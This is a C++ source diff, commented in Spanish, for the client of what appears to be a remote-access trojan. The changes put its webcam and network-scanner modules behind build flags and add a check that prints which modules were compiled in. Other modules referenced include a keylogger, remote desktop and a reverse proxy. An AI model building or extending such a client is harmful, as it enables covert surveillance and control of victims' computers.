@@ -34,6 +34,23 @@ void Cliente::Init_Key() {
 
 }
 
+void Cliente::CheckMyMods() {
+    std::cout << "CAM: "
+#ifdef __MOD_CAM
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "NET SCAN: "
+#ifdef __MOD_SCAN
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+}
+
 void Cliente::DestroyClasses() {
     if (this->mod_RemoteDesk != nullptr) {
         this->mod_RemoteDesk->DetenerLive();
@@ -61,6 +78,7 @@ void Cliente::DestroyClasses() {
         DeleteObj<mod_Keylogger>(this->mod_Key);
     }
 
+#ifdef __MOD_CAM
     if (this->mod_Cam != nullptr) {
         for (int i = 0; i < this->mod_Cam->vcCamObjs.size(); i++) {
             if (this->mod_Cam->vcCamObjs[i].isLive) {
@@ -73,7 +91,8 @@ void Cliente::DestroyClasses() {
             this->mod_dynamic->UnloadCamPros();
         }
     }
-    
+#endif
+
     if (this->mod_Fun) {
         DeleteObj<modFun>(this->mod_Fun);
         if (this->mod_dynamic) {
@@ -90,8 +109,9 @@ void Cliente::DestroyClasses() {
 
     DeleteObj<mod_AdminVentanas>(this->mod_AdminVen);
     DeleteObj<ReverseProxy>(this->mod_ReverseProxy);
+#ifdef __MOD_SCAN
     DeleteObj<mod_Escaner>(this->mod_Scan);
-    
+#endif
     __DBG_("[DC] Clases destruidas");
 }
 
@@ -126,9 +146,10 @@ Cliente::Cliente() {
 void Cliente::TEST() {
     //this->mod_dynamic->LoadNetProcs();
     //this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI);
-    this->mod_dynamic->LoadWMProcs();
+    /*this->mod_dynamic->LoadWMProcs();
     this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
-    this->mod_AdminVen->m_ListaVentanas();
+    this->mod_AdminVen->m_ListaVentanas();*/
+    this->CheckMyMods();
     return;
 }
 
@@ -524,6 +545,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#####################################################
     //#####################################################
     //#                   CAMARA                          #
+#ifdef __MOD_CAM
     if (iComando == EnumComandos::CM_Lista) {
         //Enviar lista de camaras
         if (!this->mod_Cam) {
@@ -653,7 +675,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
     //#####################################################
-
+#endif
 
     //#####################################################
     //#####################################################
@@ -1057,6 +1079,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#####################################################
     //#####################################################
     //               ESCANER DE RED                       # 
+#ifdef __MOD_SCAN
     //Escanear red PING
     if (iComando == EnumComandos::Net_Scan) {
         if (!this->mod_Scan) {
@@ -1078,6 +1101,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     }
 
     //Escaner red puertos (SCK) - TCP completo (SYN)_ requiere admin
+
     if (iComando == EnumComandos::Net_Scan_Sck || iComando == EnumComandos::Net_Scan_Syn ||
         iComando == EnumComandos::Net_Scan_Full_Sck || iComando == EnumComandos::Net_Scan_Full_Syn) {
         if (!this->mod_Scan) {
@@ -1105,6 +1129,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+#endif
 
     //#####################################################
     //#####################################################
@@ -1171,6 +1196,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_Fun->m_CD(_open);
             return;
         }
+
+    //Comando no valido o habilitado
+    //__DBG_("[X] Comando no soportado " + paquete.cBuffer);
 
 }
 
